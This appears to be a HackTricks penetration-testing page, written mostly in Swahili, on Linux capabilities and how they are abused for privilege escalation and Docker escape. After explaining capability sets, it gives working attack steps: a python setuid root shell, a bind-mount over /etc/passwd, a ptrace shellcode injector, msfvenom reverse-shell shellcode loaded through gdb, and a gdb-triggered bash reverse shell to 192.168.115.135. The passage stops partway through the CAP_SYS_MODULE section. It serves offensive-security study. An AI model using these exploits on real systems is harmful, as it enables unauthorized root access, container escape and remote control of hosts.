# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilities hugawanya **root privileges katika vitengo vidogo na tofauti**, hivyo kuruhusu process kuwa na subset ya privileges. Hii hupunguza risks kwa kutotoa root privileges kamili bila sababu.

### Tatizo:

- Normal users wana permissions chache, jambo linaloathiri tasks kama kufungua network socket ambayo inahitaji root access.

### Sets za Capabilities:

1. **Inherited (CapInh)**:

- **Purpose**: Huamua capabilities zinazopitishwa kutoka kwa parent process.
- **Functionality**: Process mpya inapoundwa, hurithi capabilities kutoka kwa parent wake katika set hii. Ni muhimu kwa kudumisha privileges fulani wakati wa kuanzisha processes nyingine.
- **Restrictions**: Process haiwezi kupata capabilities ambazo parent wake hakuwa nazo.

2. **Effective (CapEff)**:

- **Purpose**: Inawakilisha capabilities halisi ambazo process inatumia wakati wowote.
- **Functionality**: Hii ndiyo set ya capabilities ambayo kernel hukagua ili kutoa permission kwa operations mbalimbali. Kwa files, set hii inaweza kuwa flag inayoonyesha ikiwa permitted capabilities za file zinapaswa kuzingatiwa kuwa effective.
- **Significance**: Effective set ni muhimu kwa privilege checks za haraka, ikifanya kazi kama set hai ya capabilities ambazo process inaweza kutumia.

3. **Permitted (CapPrm)**:

- **Purpose**: Hufafanua set ya juu kabisa ya capabilities ambazo process inaweza kuwa nazo.
- **Functionality**: Process inaweza kuinua capability kutoka permitted set hadi effective set yake, na hivyo kupata uwezo wa kutumia capability hiyo. Pia inaweza kuondoa capabilities kutoka permitted set yake.
- **Boundary**: Hufanya kazi kama kikomo cha juu cha capabilities ambazo process inaweza kuwa nazo, kuhakikisha kuwa process haivuki scope ya privileges iliyowekewa.

4. **Bounding (CapBnd)**:

- **Purpose**: Huaintea ceiling ya capabilities ambazo process inaweza kupata wakati wowote katika lifecycle yake.
- **Functionality**: Hata ikiwa process ina capability fulani katika inheritable au permitted set yake, haiwezi kupata capability hiyo isipokuwa pia iwe katika bounding set.
- **Use-case**: Set hii ni muhimu hasa kwa kuzuia potential ya process ya kufanya privilege escalation, na kuongeza security layer ya ziada.

5. **Ambient (CapAmb)**:
- **Purpose**: Huruhusu capabilities fulani kudumishwa wakati wa `execve` system call, ambayo kwa kawaida ingesababisha reset kamili ya capabilities za process.
- **Functionality**: Huhakikisha kuwa programs zisizo za SUID ambazo hazina file capabilities zinazohusiana zinaweza kuhifadhi privileges fulani.
- **Restrictions**: Capabilities katika set hii zinategemea constraints za inheritable na permitted sets, kuhakikisha hazivuki privileges zinazoruhusiwa kwa process.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Kwa maelezo zaidi angalia:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Processes & Binaries Capabilities

### Processes Capabilities

Ili kuona capabilities za process fulani, tumia faili la **status** katika directory ya /proc. Kwa kuwa linatoa maelezo zaidi, tuweke kikomo kwenye taarifa zinazohusiana na Linux capabilities.\
Kumbuka kwamba kwa processes zote zinazoendelea, taarifa za capabilities huhifadhiwa kwa kila thread; kwa binaries katika file system, huhifadhiwa katika extended attributes.

Unaweza kupata capabilities zilizofafanuliwa katika /usr/include/linux/capability.h

Unaweza kupata capabilities za process ya sasa kwa kutumia `cat /proc/self/status` au kwa kutekeleza `capsh --print`, na za users wengine katika `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
This command inapaswa kurudisha mistari 5 kwenye mifumo mingi.

- CapInh = capabilities zilizorithiwa
- CapPrm = capabilities zinazoruhusiwa
- CapEff = capabilities zinazotumika
- CapBnd = seti ya Bounding
- CapAmb = seti ya capabilities za Ambient
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Nambari hizi za hexadecimal hazina maana. Kwa kutumia utility ya capsh, tunaweza kuzifafanua kuwa majina ya capabilities.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Sasa tuchunguze **capabilities** zinazotumiwa na `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Ingawa hiyo inafanya kazi, kuna njia nyingine na rahisi zaidi. Ili kuona capabilities za process inayoendesha, tumia tu tool ya **getpcaps** ikifuatiwa na process ID (PID) yake. Unaweza pia kutoa orodha ya process IDs.
```bash
getpcaps 1234
```
Hebu tuchunguze hapa uwezo wa `tcpdump` baada ya kuipa binary uwezo wa kutosha (`cap_net_admin` na `cap_net_raw`) wa kunasa trafiki ya mtandao (_tcpdump inaendeshwa katika process 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Kama unavyoona, capabilities zilizotolewa zinaendana na matokeo ya njia 2 za kupata capabilities za binary.\
Tool ya _getpcaps_ hutumia system call ya **capget()** kuuliza capabilities zinazopatikana kwa thread fulani. System call hii inahitaji tu PID ili kupata maelezo zaidi.

### Capabilities za Binaries

Binaries zinaweza kuwa na capabilities zinazoweza kutumika wakati wa execution. Kwa mfano, ni jambo la kawaida sana kupata binary ya `ping` ikiwa na capability ya `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Unaweza **kutafuta binary zenye capabilities** kwa kutumia:
```bash
getcap -r / 2>/dev/null
```
### Kuondoa capabilities kwa kutumia capsh

Tukiondoa capabilities za CAP*NET_RAW kwa ajili ya \_ping*, basi utility ya ping haipaswi tena kufanya kazi.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Besides the output of _capsh_ itself, the _tcpdump_ command itself should also raise an error.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Hitilafu inaonyesha wazi kwamba command ya ping hairuhusiwi kufungua ICMP socket. Sasa tunajua kwa uhakika kwamba hii inafanya kazi kama ilivyotarajiwa.

### Ondoa Capabilities

Unaweza kuondoa capabilities za binary kwa kutumia
```bash
setcap -r </path/to/binary>
```
## Capabilities za Mtumiaji

Inaonekana **inawezekana pia kugawa capabilities kwa users**. Huenda hii inamaanisha kwamba kila process itakayotekelezwa na user itaweza kutumia capabilities za user huyo.\
Kulingana na [hii](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [hii ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)na [hii ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), kuna files chache zinazohitaji kusanidiwa ili kumpa user capabilities fulani, lakini file inayogawa capabilities kwa kila user itakuwa `/etc/security/capability.conf`.\
Mfano wa file:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Uwezo wa Mazingira

Kukompile programu ifuatayo kunawezesha **spawn bash shell ndani ya mazingira yanayotoa capabilities**.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Ndani ya **bash inayotekelezwa na ambient binary iliyocompile** inawezekana kuona **capabilities mpya** (mtumiaji wa kawaida hatakuwa na capability yoyote katika sehemu ya "current").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Unaweza **kuongeza capabilities ambazo zipo** katika seti zote mbili za permitted na inheritable.

### Capability-aware/Capability-dumb binaries

**Capability-aware binaries hazitatumia capabilities mpya** zinazopewa na mazingira, hata hivyo **capability-dumb binaries zitazitumia** kwa sababu hazitazikataa. Hii hufanya capability-dumb binaries ziwe vulnerable ndani ya mazingira maalum yanayozipa binaries capabilities.

## Service Capabilities

Kwa default, **service inayotumia root hupewa capabilities zote**, na wakati mwingine hii inaweza kuwa hatari.\
Kwa hiyo, faili ya **service configuration** inaruhusu **kubainisha** **capabilities** unazotaka iwe nazo, pamoja na **user** anayepaswa kutekeleza service, ili kuepuka kuendesha service yenye privileges zisizo za lazima:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities katika Docker Containers

Kwa chaguo-msingi, Docker huzipa containers capabilities chache. Ni rahisi sana kuangalia capabilities hizo ni zipi kwa kuendesha:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities ni muhimu unapohitaji **kuzuia michakato yako mwenyewe baada ya kutekeleza shughuli zenye mamlaka ya juu** (kwa mfano, baada ya kusanidi chroot na kuunganisha kwenye socket). Hata hivyo, zinaweza kutumiwa vibaya kwa kuzipitishia commands au arguments hasidi, ambazo huendeshwa kama root.

Unaweza kulazimisha capabilities kwenye programs kwa kutumia `setcap`, na kuziuliza kwa kutumia `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` inamaanisha unaongeza capability (“-” ingeiondoa) kama Effective na Permitted.

Ili kutambua programs kwenye system au folder zilizo na capabilities:
```bash
getcap -r / 2>/dev/null
```
### Mfano wa exploitation

Katika mfano ufuatao, binary `/usr/bin/python2.6` imegunduliwa kuwa vulnerable kwa privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** zinazohitajika na `tcpdump` ili **kumruhusu mtumiaji yeyote kunasa pakiti**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Kisa maalum cha capabilities "tupu"

[Kutoka kwenye docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): Kumbuka kwamba mtu anaweza kuweka capability sets tupu kwenye program file, na hivyo inawezekana kuunda set-user-ID-root program inayobadilisha effective na saved set-user-ID ya process inayotekeleza program hiyo kuwa 0, lakini haipelei capabilities zozote kwa process hiyo. Au, kwa ufupi, ikiwa una binary ambayo:

1. haihusiani na root
2. haina bits za `SUID`/`SGID` zilizowekwa
3. ina capabilities set tupu (kwa mfano: `getcap myelf` inarudisha `myelf =ep`)

basi **binary hiyo itaendeshwa kama root**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** ni Linux capability yenye nguvu sana, ambayo mara nyingi hulinganishwa na kiwango cha karibu na root kutokana na **administrative privileges** zake pana, kama vile kumount devices au kudhibiti kernel features. Ingawa ni muhimu kwa containers zinazoiga systems nzima, **`CAP_SYS_ADMIN` huleta changamoto kubwa za security**, hasa katika mazingira ya containerized, kutokana na uwezekano wake wa kusababisha privilege escalation na system compromise. Kwa hiyo, matumizi yake yanahitaji security assessments kali na usimamizi wa tahadhari, huku ikipendelewa sana kuondoa capability hii kwenye application-specific containers ili kufuata **principle of least privilege** na kupunguza attack surface.

**Mfano wa binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Kwa kutumia Python, unaweza ku-mount faili ya _passwd_ iliyorekebishwa juu ya faili halisi ya _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Na hatimaye **mount** faili ya `passwd` iliyorekebishwa kwenye `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Na utaweza kutumia **`su` kama root** ukitumia password "password".

**Mfano wenye environment (Docker breakout)**

Unaweza kuangalia capabilities zilizowezeshwa ndani ya docker container kwa kutumia:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Ndani ya output iliyotangulia unaweza kuona kwamba capability ya SYS_ADMIN imewezeshwa.

- **Mount**

Hii inaruhusu docker container **ku-mount disk ya host na kuifikia bila vizuizi**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Ufikiaji kamili**

Katika mbinu iliyotangulia tuliweza kufikia diski ya docker host.\
Iwapo utagundua kuwa host inaendesha server ya **ssh**, unaweza **kuunda user ndani ya** diski ya docker host na kuifikia kupitia SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**Hii inamaanisha kwamba unaweza kutoroka kutoka kwenye container kwa kuingiza shellcode ndani ya process fulani inayoendesha ndani ya host.** Ili kufikia process zinazoendesha ndani ya host, container inahitaji kuendeshwa angalau ikiwa na **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** inatoa uwezo wa kutumia utendakazi wa debugging na system call tracing unaotolewa na `ptrace(2)`, pamoja na cross-memory attach calls kama `process_vm_readv(2)` na `process_vm_writev(2)`. Ingawa ina nguvu kwa madhumuni ya diagnostic na monitoring, ikiwa `CAP_SYS_PTRACE` imewezeshwa bila hatua za kuzuia kama seccomp filter kwenye `ptrace(2)`, inaweza kudhoofisha kwa kiasi kikubwa usalama wa mfumo. Hasa, inaweza kutumiwa kukwepa vizuizi vingine vya usalama, hasa vile vilivyowekwa na seccomp, kama inavyoonyeshwa na [proofs of concept (PoC) kama hii](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Mfano wenye binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Mfano wa binary (gdb)**

`gdb` yenye capability ya `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Unda shellcode kwa msfvenom ili ku-inject kwenye memory kupitia gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debug process ya root kwa kutumia gdb na copy-paste mistari ya gdb iliyotengenezwa hapo awali:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Mfano wenye environment (Docker breakout) - Matumizi mabaya mengine ya gdb**

Ikiwa **GDB** imesakinishwa (au unaweza kuisakinisha kwa `apk add gdb` au `apt install gdb`, kwa mfano), unaweza **kufanya debug ya process kutoka kwa host** na kuifanya iite function ya `system`. (Technique hii pia inahitaji capability ya `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Hutaweza kuona matokeo ya command iliyotekelezwa, lakini itatekelezwa na process hiyo (kwa hivyo pata rev shell).

> [!WARNING]
> Ukipata error "No symbol "system" in current context." angalia mfano uliotangulia wa kupakia shellcode kwenye program kupitia gdb.

**Example with environment (Docker breakout) - Shellcode Injection**

Unaweza kuangalia capabilities zilizowezeshwa ndani ya docker container kwa kutumia:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Orodhesha **processes** zinazoendesha kwenye **host** `ps -eaf`

1. Pata **architecture** `uname -m`
2. Tafuta **shellcode** ya architecture hiyo ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Tafuta **program** ya **inject** **shellcode** kwenye process memory ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modify** **shellcode** ndani ya program na u-compile `gcc inject.c -o inject`
5. I-**inject** na upate **shell** yako: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** huwezesha process **kupakia na kuondoa kernel modules (`init_module(2)`, `finit_module(2)` na `delete_module(2)` system calls)**, hivyo kutoa ufikiaji wa moja kwa moja wa shughuli kuu za kernel. Capability hii inaleta hatari kubwa za kiusalama, kwa kuwa huwezesha privilege escalation na compromise kamili ya system kwa kuruhusu marekebisho kwenye kernel, na hivyo kupita Linux security mechanisms zote, ikiwemo Linux Security Modules na container isolation.
**Hii inamaanisha kwamba unaweza** **kuingiza/kuondoa kernel modules ndani/kutoka kwenye kernel ya host machine.**

**Mfano wa binary**

Katika mfano ufuatao binary **`python`** ina capability hii.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Kwa chaguo-msingi, amri ya **`modprobe`** hukagua orodha ya dependencies na faili za mapu katika saraka ya **`/lib/modules/$(uname -r)`**.\
Ili kutumia udhaifu huu, hebu tuunde folda bandia ya **`lib/modules`**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Kisha **compile kernel module unayoweza kupata katika mifano 2 hapa chini na uinakili** kwenye folda hii:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Hatimaye, tekeleza code ya python inayohitajika ili kupakia kernel module hii:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Mfano wa 2 wenye binary**

Katika mfano ufuatao binary **`kmod`** ina capability hii.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Hii inamaanisha kwamba inawezekana kutumia amri **`insmod`** kuingiza kernel module. Fuata mfano ulio hapa chini kupata **reverse shell** kwa kutumia vibaya privilege hii.

**Mfano wenye environment (Docker breakout)**

Unaweza kuangalia capabilities zilizowezeshwa ndani ya docker container kwa kutumia:
```bash
capsh --print
